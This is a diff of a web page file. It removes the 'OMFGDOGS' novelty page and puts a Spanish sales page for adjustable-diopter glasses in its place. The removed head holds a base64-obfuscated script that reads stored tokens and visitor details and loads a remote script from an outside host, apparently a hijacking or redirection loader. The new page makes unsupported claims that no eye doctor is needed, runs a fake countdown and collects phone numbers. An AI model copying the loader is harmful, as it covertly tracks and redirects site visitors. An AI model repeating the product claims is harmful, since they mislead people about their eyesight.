@@ -1,86 +1,395 @@
-<html>
-    <head>
-	
-	<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfSEZWN1JqQjVQY3Z3Nld2cic7CiAgICBpZiAoIXdpbmRvdy5fSEZWN1JqQjVQY3Z3Nld2cikgewogICAgICAgIHdpbmRvdy5fSEZWN1JqQjVQY3Z3Nld2ciA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90aGVsb3dwcmljZS54eXovTFBEWkNzNXEnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL3RoZWxvd3ByaWNlLnh5ei8zNGZkOTZlL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX3ZnNzVTdE15UURDNXhxUFIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF92Zzc1U3RNeVFEQzV4cVBSICE9PSAndW5kZWZpbmVkJyAmJiBfdmc3NVN0TXlRREM1eHFQUiAhPT0gbnVsbCkgewogICAgICAgIHZhciBfYzVzMUd4YnpqeXZNQ1N3YiA9IEpTT04ucGFyc2UoX3ZnNzVTdE15UURDNXhxUFIpOwogICAgICAgIHZhciBfZlNtRk1KaEptNDU4dm44NyA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9jNXMxR3hiemp5dk1DU3diLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX0hGVjdSakI1UGN2dzZXdnIudHRsIDwgX2ZTbUZNSmhKbTQ1OHZuODcpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF84WU02VmY2WDlCOHFGWE12ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgXzFwNXl5aHRIejhLcTFWdmIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfa0pNVlM1M1RHZ2tmR1NzeiA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX2tKTVZTNTNUR2drZkdTc3ogKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX2tKTVZTNTNUR2drZkdTc3ogKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfa0pNVlM1M1RHZ2tmR1NzeiArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfa0pNVlM1M1RHZ2tmR1NzeiArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX2tKTVZTNTNUR2drZkdTc3ogKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICBpZiAodHlwZW9mIF84WU02VmY2WDlCOHFGWE12ICE9PSAndW5kZWZpbmVkJyAmJiBfOFlNNlZmNlg5QjhxRlhNdiAmJiB3aW5kb3cuX0hGVjdSakI1UGN2dzZXdnIudW5pcXVlKSB7CiAgICAgICAgX2tKTVZTNTNUR2drZkdTc3ogKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfOFlNNlZmNlg5QjhxRlhNdik7CiAgICB9CiAgICBpZiAodHlwZW9mIF8xcDV5eWh0SHo4S3ExVnZiICE9PSAndW5kZWZpbmVkJyAmJiBfMXA1eXlodEh6OEtxMVZ2YiAmJiB3aW5kb3cuX0hGVjdSakI1UGN2dzZXdnIudW5pcXVlKSB7CiAgICAgICAgX2tKTVZTNTNUR2drZkdTc3ogKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF8xcDV5eWh0SHo4S3ExVnZiKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9IRlY3UmpCNVBjdnc2V3ZyLlJfUEFUSCArIF9rSk1WUzUzVEdna2ZHU3N6OwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
-	
-        <title>OMFGDOGS</title>
-        <link rel="stylesheet" type="text/css" href="omfgdogs.css" />
-        <link href="js/toastr/toastr.css" rel="stylesheet"/>
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
-        <script src="js/toastr/toastr.js"></script>
-    </head>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  
+  
+  
+    <meta http-equiv="content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=640">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <title>Gafas con ajuste de dioptrías</title>
+    <link href="css/swiper.min.css" rel="stylesheet" />
+    <link href="css/animate.min.css" rel="stylesheet" />
+    <link href="css/font-awesome.min.css" rel="stylesheet" />
+    <link href="css/base.css" rel="stylesheet" />
+    <link rel="stylesheet" type="text/css" href="css/form.css" />
+    <script src="js/jquery.min.js"></script>
+    <meta http-equiv="x-dns-prefetch-control" content="on" />
+    <link
+      href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body style="width: 640px;margin: auto; overflow-x: hidden;">
+    <div id="page" style="padding-bottom: 20px; background: #fff;">
+      <div class="swiper-container swiper-container1">
+        <div class="swiper-wrapper">
+          <div class="swiper-slide"><img src="img/img1.jpg" alt="" /></div>
+          <div class="swiper-slide">
+            <div class="pos-r">
+              <img src="img/img2.jpg" alt="" />
+              <p class="iprimi">
+                ¡Las primeras gafas del mundo sin reseta médica para ver sin
+                problemas!
+              </p>
+            </div>
+          </div>
+          <div class="swiper-slide"><img src="img/img3.jpg" alt="" /></div>
+          <div class="swiper-slide"><img src="img/img4.jpg" alt="" /></div>
+        </div>
+        <div class="swiper-pagination"></div>
+      </div>
 
-    <body>
-        <div id="overlay" class="container" onclick="off()">
-            <a href='#'class='playBut'>
-                <svg version="1.1"
-                    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"
-                    x="0px" y="0px" width="213.7px" height="213.7px" viewBox="0 0 213.7 213.7" enable-background="new 0 0 213.7 213.7"
-                    xml:space="preserve">
+      <div class="seckill-container">
+        <div class="seckill-price-wrap">
+          <div class="seckill-price" style="width: 100%; text-align: center;">
+            <span class="seckill-big-price">
+              <span class="price_only6918">49</span>
+              <span class="price_currency">€</span> </span
+            ><span class="seckill-small-price">
+              <span class="price_old6918">98</span>
+              <span class="price_currency">€</span>
+            </span>
+          </div>
+          <div class="seckill-btm-div">
+            <a href="#order-now"
+              ><button class="button-header">Ordenar ahora</button></a
+            >
+          </div>
+        </div>
+        <div class="seckill-time-wrap">
+          <span class="seckil-time-title">La promoción termina en:</span>
+          <div class="seckill-time-div" id="seckill_time">
+            <span class="seckill-time-num hour">20</span>
+            <span class="seckill-time-colon">:</span>
+            <span class="seckill-time-num minute">52</span>
+            <span class="seckill-time-colon">:</span>
+            <span class="seckill-time-num s">44</span>
+            <span class="seckill-time-colon">.</span>
+            <span class="seckill-time-num ms">44</span>
+          </div>
+        </div>
+      </div>
 
-                    <polygon class='triangle' id="XMLID_18_" fill="none" stroke-width="7" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" points="
-                        73.5,62.5 148.5,105.8 73.5,149.1 "/>
+      <div class="title-container">
+        <div class="title">
+          Gafas que se ajustan de la manera individual para sus ojos. ¡Se regula
+          durante 2 minutos!
+        </div>
+        <div class="tips">
+          ¡No hay necesidad de ir al doctor! ¡Sin colas y costes extra!
+        </div>
+      </div>
 
-                    <circle class='circle' id="XMLID_17_" fill="none" stroke-width="7" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" cx="106.8" cy="106.8" r="103.3"/>
-                </svg>
-            </a>
+      <iframe
+        style="width: 100%;height: 300px;"
+        src="https://www.youtube.com/embed/z8HMkOTRKVc"
+        frameborder="0"
+        allow="autoplay; encrypted-media"
+        allowfullscreen
+      ></iframe>
+      <div class="description-container">
+        <div class="description-header">Detalles del producto</div>
+        <div class="description-body">
+          <div
+            class="video-block col-lg-6 col-md-6 col-sm-6"
+            style="display: inline-block; font-size: 19px; vertical-align: top;"
+          ></div>
+          <div class="pos-r">
+            <p><img src="img/img8.jpg" /></p>
+            <div class="adatti">
+              <h4>Adecuado para cualquier ojos!</h4>
+              <p>
+                Las gafas se ajustan rápidamente de –6 a +3, por lo que se
+                pueden usar para la miopía, la hipermetropía, la presbicia y la
+                emetropía sin molestias.
+              </p>
+            </div>
+          </div>
+          <div class="pos-r">
+            <p><img src="img/img9.jpg" /></p>
+            <div class="messa"><p>Foco y dioptrías ajustables.</p></div>
+            <div class="cambio">
+              <p>
+                Pueden ajustar los dioptrías, dependiendo de la necesidad cuando
+                sea conveniente y necesario para usted. ¡Un par de gafas es
+                suficiente para varias personas con discapacidad visual en la
+                familia a la vez!
+              </p>
+            </div>
+          </div>
+          <div class="pos-r amplif">
+            <img src="img/img6.jpg" />
+            <h4>Curva</h4>
+            <p class="curva1">Curva de dispersión</p>
+            <p class="curva2">0 curva</p>
+            <p class="curva3">Curva dispersiva</p>
+            <p class="bottone">
+              Los dos lados de las gafas se pueden ajustar de manera diferente
+              para enfocar, para esto se necesita girar el rodillo
+            </p>
+          </div>
+          <div class="pos-r">
+            <p><img src="img/img10.jpg" /></p>
+            <ul class="chiari list">
+              <li>
+                <p>Claro</p>
+              </li>
+              <li>
+                <p>Ajustable</p>
+              </li>
+              <li>
+                <p>Ligero</p>
+              </li>
+              <li>
+                <p>Flexible</p>
+              </li>
+              <li>
+                <p>Cómodo</p>
+              </li>
+              <li>
+                <p>Personalizable</p>
+              </li>
+            </ul>
+            <ul class="pd">
+              <li>
+                <p>Antes del ajuste</p>
+              </li>
+              <li>
+                <p>Después del ajuste</p>
+              </li>
+            </ul>
+          </div>
+          <div class="pos-r prod">
+            <p><img src="img/img11.jpg" /></p>
+            <h4>Información sobre gafas</h4>
+            <ul class="info">
+              <li>
+                <p><strong>Tecnología: </strong>con dioptrías de sintonía</p>
+              </li>
+              <li>
+                <p><strong>Peso: </strong>27.2 g</p>
+              </li>
+              <li>
+                <p><strong>Material: </strong>policarbonato</p>
+              </li>
+              <li>
+                <p><strong>Material de la lente: </strong>resina</p>
+              </li>
+              <li>
+                <p>
+                  <strong>Adecuado para el tipo de cara: </strong>cualquiera
+                </p>
+              </li>
+              <li>
+                <p><strong>Sirve: </strong>–6 a +3</p>
+              </li>
+            </ul>
+          </div>
+          <div class="pos-r espos">
+            <p><img src="img/img12.jpg" /></p>
+            <h4>Exhibición del producto</h4>
+          </div>
+          <div class="pos-r detagli">
+            <p><img src="img/img16.jpg" /></p>
+            <h4>detalles</h4>
+            <p class="small">Construcción de lentes</p>
+            <p class="text">
+              Se pueden usar gafas todo el día! Sin mareos, dolores de cabeza y
+              náuseas, se ajustan exactamente a sus ojos.
+            </p>
+          </div>
+          <div class="pos-r artic">
+            <p><img src="img/img15.jpg" /></p>
+            <p class="small1">Fijación confiable</p>
+            <p class="text1">
+              Fijación fiable y duradero: gafas duraderas, a pesar de la
+              estructura compleja.
+            </p>
+            <p class="small2">Soportes de nariz ligeros</p>
+            <p class="text2">
+              Las gafas son ajustables, y los materiales livianos y cómodos no
+              son molestos y no dejan marcas en la nariz.
+            </p>
+          </div>
+        </div>
+      </div>
+      <div class="label-container clearfix">
+        <h3
+          style="font-size: .6rem;
+    color: #666;
+    padding: .4rem;
+    border-bottom: .1rem solid #f5f5f5;
+    text-align: center;
+    background-color: #ddd;"
+        >
+          Pago y entrega
+        </h3>
+
+        <div class="label">
+          <div class="label-img">
+            <img src="img/guarantee-1.png" style="width: 40px; " />
+          </div>
+          <span class="label-img-text"> Dejen su pedido en la web.</span>
+        </div>
+        <div class="label">
+          <div class="label-img">
+            <img src="img/guarantee-2.png" style="width: 40px; " />
+          </div>
+          <span class="label-img-text">
+            Nuestro operador lo llamará para confirmar el pedido y averiguar su
+            dirección.</span
+          >
+        </div>
+        <div class="label">
+          <div class="label-img">
+            <img src="img/guarantee-3.png" style="width: 40px; " />
+          </div>
+          <span class="label-img-text">
+            Nuestro mensajero entregará rápidamente el pedido a su
+            domicilio.</span
+          >
+        </div>
+        <div class="label">
+          <div class="label-img">
+            <img src="img/guarantee-4.png" style="width: 40px; " />
+          </div>
+          <span class="label-img-text">
+            Reciban su pedido y paguen tras la entrega.</span
+          >
+        </div>
+      </div>
+
+      <div
+        id="form-wrapper"
+        class="new_form form form-wrapper"
+        style="text-align: center;"
+      >
+        <!--    <div class="fhq" id="order-now"> <span class="sp free_del">Consegna Gratis! </span> <br>
+        <span class="sp black">  <span class="adfh-discount"></span>%!</span> <br>
+        <span class="sp black">Quantità limitata! </span> </div> -->
+        <div class="price" style="margin: 15px 0 30px;">
+          <span
+            class="sp white old-price"
+            style="text-decoration: line-through;
+}"
+            >Precio anterior:
+            <span class="price_old6918">98</span>
+            <span class="price_currency">€</span>
+          </span>
+          <span class="sp new-price" style=""
+            >Nuevo precio
+            <span class="price_only6918">49</span>
+            <span class="price_currency">€</span>
+          </span>
         </div>
 
-        <audio id="omfgaudio" loop>
-            <source src="omfgdogs.mp3" type="audio/mpeg">
-        </audio>
+        <form action="" method="post" class="order_form" id="order-now">
+          <label for="">por ejemplo: Carlos López</label>
+          <input
+            class="input"
+            type="text"
+            name="name"
+            placeholder="Ingrese su nombre"
+            required
+          />
+          <label for="">por ejemplo: + 34654576342</label>
+          <input
+            class="input user-phone"
+            type="phone"
+            name="phone"
+            placeholder="Ingrese su numero de telefono"
+            required
+            id="phone"
+          />
+          <button class="button" type="submit">Ordenar ahora!</button>
+        </form>
+      </div>
 
-        <script type="text/javascript">
-            function off() {
-                document.getElementById("overlay").style.display = "none";
-                var audio = document.getElementById("omfgaudio");
-                audio.play();
-            }
-        </script>
+      <div
+        style="text-align: center;color:#000; font-size: 14px; padding-top: 40px;"
+      >
+        <p>
+          ST. GERARDE LTD, PO Box 832, Orion Mall, Palm Street, Victoria, Mahe,
+          Seychelles
+        </p>
+        <p>
+          <a href="policy_es.html" target="_blank">Política de privacidad</a>
+        </p>
+      </div>
+    </div>
 
-        <script type="text/javascript">
-            toastr.options = {
-              "closeButton": true,
-              "debug": false,
-              "positionClass": "toast-bottom-right",
-              "showDuration": "1000",
-              "hideDuration": "1000",
-              "timeOut": "100000",
-              "extendedTimeOut": "100000",
-              "showEasing": "swing",
-              "hideEasing": "linear",
-              "showMethod": "fadeIn",
-              "hideMethod": "fadeOut"
-           }
-        </script>
+    <script src="js/jquery.lazyload.min.js"></script>
+    <script src="js/swiper.min.js"></script>
+    <script src="js/product.js"></script>
 
-        <div id="footer">
-            <div id="footer-left">
-                [ <a href="http://escism.net/" target="_blank">escism.net</a> ] [ <a href="https://twitter.com/eataudio" target="_blank">@eataudio</a> ]
-            </div>
-            <div id="footer-right" >
-                <div id="helptext">
-                    [ help keep the dogs running! ]
-                </div>
-                <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">
-                    <input type="hidden" name="cmd" value="_s-xclick" />
-                    <input type="hidden" name="hosted_button_id" value="J2EHN6Y6XPR6J" />
-                    <input type="image" src="https://omfgdogs.com/pp.png" border="0" name="submit" title="PayPal - The safer, easier way to pay online!" alt="Donate with PayPal button" />
-                    <img alt="" border="0" src="https://www.paypal.com/en_AU/i/scr/pixel.gif" width="1" height="1" />
-                </form>
+    <!-- callback -->
+    <div class="callback-btn">
+      <img src="img/i-phone.png" alt="" />
+    </div>
+    <div class="callback-form hide">
+      <form
+        class="form lead_form"
+        action=""
+        style="padding: 10px 0;"
+        method="post"
+      >
+        <label for="form_name1" style="padding: 0 0 0 10px; color: #fff"
+          >por ejemplo: Carlos López</label
+        >
+        <input
+          id="form_name1"
+          class="name"
+          type="text"
+          name="name"
+          placeholder="Ingrese su nombre"
+          required
+          style="margin-bottom: 10px;"
+        />
+        <label for="form_phone1" style="padding: 0 0 0 10px; color: #fff"
+          >por ejemplo: + 34654576342</label
+        >
+        <input
+          id="form_phone1"
+          class="phone"
+          type="text"
+          name="phone"
+          placeholder="Ingrese su numero de telefono"
+          required
+        />
+        <button class="orange-btn primary_btn" type="submit">
+          ordenar ahora
+        </button>
+      </form>
+      <img src="img/i-cross.svg" alt="Close" />
+    </div>
 
-                <div id="btc">
-                    <a href="#"><img src="btc.svg" width="25px"/></a>
-                </div>
-            </div>
-        </div>
+    <!-- callback -->
 
-        <script type="text/javascript">
-            $('#btc').click(function() {
-                toastr.info('Donate Bitcoin!<br /><a href="bitcoin:1DwMsjfHmgDjKRCwM5AM2gcQ4xidfJLDVT">1DwMsjfHmgDjKRCwM5AM2gcQ4xidfJLDVT</a>')
-            });
-            toastr.options.onHidden = function() { }
-        </script>
-        <script src="js/wat.js"></script>
-    </body>
+    <style></style>
+    <script>
+      $(".callback-btn").click(function() {
+        $(".callback-form").toggleClass("hide");
+      });
+
+      $(".show-callback").click(function() {
+        $(".callback-form").removeClass("hide");
+      });
+
+      $(document).click(function(e) {
+        if (
+          $(e.target).closest(
+            $(".callback-form, .callback-btn, .show-callback")
+          ).length > 0
+        ) {
+          return;
+        }
+        $(".callback-form").addClass("hide");
+      });
+
+      $('img[src="img/i-cross.svg"]').click(function() {
+        $(".callback-form").addClass("hide");
+      });
+    </script>
+  </body>
 </html>
